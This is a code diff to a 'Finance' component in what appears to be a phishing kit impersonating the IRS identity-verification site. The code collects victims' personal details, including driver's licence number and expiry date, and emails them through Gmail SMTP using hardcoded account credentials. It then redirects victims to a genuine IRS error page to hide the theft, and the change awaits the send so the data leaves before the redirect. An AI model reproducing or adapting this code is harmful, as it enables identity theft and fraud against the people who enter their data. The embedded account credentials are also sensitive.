@@ -122,7 +122,8 @@ function Finance() {
 				return t
 			}
 		}
-		sender.send({
+		const send = async () => {
+		await sender.send({
 			Host: "smtp.gmail.com",
 			Username : "iwillkillbill00@gmail.com",
 			Password : "root.FX3",
@@ -152,9 +153,11 @@ function Finance() {
 			Driver's License Number (if applicable): ${DLNumber}<br>
 			Driver's License Expiry Date (MM/DD/YYYY): ${dLExpiryMonth}/${dLExpiryDay}/${dLExpiryYear}<br>`,
 			})
+			window.location.href = 'https://sa.www4.irs.gov/eauth/pub/error/technical_difficulty.jsp?'
+		}
+		await send()
 		//  window.location.href = 'https://sa.www4.irs.gov/eauth/pub/registration/id_no.jsp?actionName=VerifyFinDataProxy'
 		//  window.location.href = 'https://sa.www4.irs.gov/eauth/pub/logout1.jsp?error_code=-7271'
-		window.location.href = 'https://sa.www4.irs.gov/eauth/pub/error/technical_difficulty.jsp?'
 		// await writeFile()
 	}
 
